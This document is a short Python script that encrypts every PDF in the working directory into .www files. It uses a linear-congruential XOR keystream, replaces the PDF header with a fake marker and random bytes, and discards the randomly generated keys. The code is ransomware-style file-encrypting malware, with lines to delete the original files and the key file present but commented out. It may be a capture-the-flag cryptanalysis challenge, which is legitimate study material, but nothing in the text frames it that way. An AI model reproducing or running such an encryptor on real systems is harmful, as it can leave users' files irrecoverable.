import os

target_ext = ".pdf"


def define_keys():
    from Crypto.Util.number import getRandomInteger

    return (
        getRandomInteger(32),
        getRandomInteger(32),
        getRandomInteger(32),
        os.urandom(100),
    )
    # with open('keys.txt', 'r') as f:
    #     a = int(f.readline())
    #     x = int(f.readline())
    #     b = int(f.readline())
    #     modified_header_text = f.readline()[:-1].encode()
    # return a, x, b, modified_header_text


def encryptor01(a, x, b, m):
    return (a * x + b) % m


def encryptor02(filename):
    f = open(filename + target_ext, "rb")
    g = open(filename + ".www", "wb")

    # define keys
    a, x, b, modified_header_text = define_keys()
    m = pow(2, 32)

    assert a < m and x < m and b < m

    data = bytearray(f.read())
    data_length = len(data)
    padding_length = (-data_length) % 4
    data += b"\x00" * padding_length
    data_length += padding_length

    # header modification!
    index = 0
    modified_header = b"%PDF-9.9"
    modified_header += modified_header_text
    while True:
        if index >= len(modified_header):
            break
        data[index] = modified_header[index]
        index += 1

    # main encryption process
    index = 0
    while True:
        if index == data_length:
            break
        plain = int.from_bytes(data[index : index + 4], "big")
        x = encryptor01(a, x, b, m) ^ plain
        g.write(x.to_bytes(4, "big"))
        index += 4

    f.close()
    g.close()


if __name__ == "__main__":
    filenames = os.listdir(".")
    for filename in filenames:
        if filename[-len(target_ext) :] == target_ext:
            encryptor02(filename[: -len(target_ext)])
            # os.remove(filename)
    # os.remove('keys.txt')
